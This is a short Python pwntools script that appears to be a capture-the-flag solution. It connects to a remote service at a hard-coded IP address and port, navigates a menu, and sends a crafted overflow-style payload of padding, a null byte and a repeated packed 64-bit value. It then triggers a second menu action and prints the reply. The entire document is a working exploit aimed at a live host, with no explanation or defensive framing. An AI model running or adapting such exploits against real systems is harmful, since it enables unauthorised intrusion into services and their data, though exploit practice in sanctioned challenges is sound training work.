from pwn import *

p = remote("103.37.125.237", 10001)

p.recvuntil(b"> ")
p.sendline(b"1")
p.recvuntil(b": ")
p.sendline(b"23")
p.recvuntil(b": ")

payload1 = b"A"*23 + b"\x00" + (p64(78647)*30)
p.sendline(payload1)

p.recvuntil(b"> ")
p.sendline(b"2")
p.recvuntil(b": ")
p.sendline(payload1)
print(p.recv())
